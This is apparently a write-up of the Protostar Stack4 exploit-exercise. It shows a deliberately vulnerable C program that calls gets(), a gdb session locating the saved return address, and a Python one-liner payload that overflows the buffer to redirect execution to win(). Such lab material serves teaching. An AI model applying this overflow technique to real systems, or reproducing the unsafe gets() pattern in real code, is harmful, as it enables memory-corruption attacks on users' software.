#### Protostar Stack4 

##### About
Stack4 takes a look at overwriting saved EIP and standard buffer overflows.  
  
This level is at /opt/protostar/bin/stack4

###### Hints
* A variety of introductory papers into buffer overflows may help.
* gdb lets you do “run < input”
* EIP is not directly after the end of buffer, compiler padding can also increase the size.

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

BOF buffer to change the return value of function main().

##### Solution
```
$ python -c "print 'A'*64" > /tmp/payload
$ gdb stack4
......
(gdb) print win
$1 = {void (void)} 0x80483f4 <win>
......
(gdb) disas main
Dump of assembler code for function main:
0x08048408 <+0>:    push   ebp
0x08048409 <+1>:    mov    ebp,esp
0x0804840b <+3>:    and    esp,0xfffffff0
0x0804840e <+6>:    sub    esp,0x50
0x08048411 <+9>:    lea    eax,[esp+0x10]       ; buffer[64]
0x08048415 <+13>:   mov    DWORD PTR [esp],eax
0x08048418 <+16>:   call   0x804830c <gets@plt> ; overflow
0x0804841d <+21>:   leave
0x0804841e <+22>:   ret
End of assembler dump.
......
(gdb) break *0x0804841d
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
......
(gdb) r < /tmp/payload
Breakpoint 1, main (argc=1, argv=0xbffff874) at stack4/stack4.c:16
(gdb) x/2x $ebp
0xbffff7c8:     0xbffff848      0xb7eadc76 ; <-- here are $ebp and $eip
......
(gdb) x/24x $esp
0xbffff770:     0xbffff780      0xb7ec6165      0xbffff788      0xb7eada75
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7c0:     0x08048400      0x00000000      0xbffff848      0xb7eadc76
......
(gdb) quit
$ python -c "print 'A'*76 + '\xf4\x83\x04\x08'" | ./stack4
```

##### Reference
<https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>  
<https://thesprawl.org/research/exploit-exercises-protostar-stack/#stack-4>
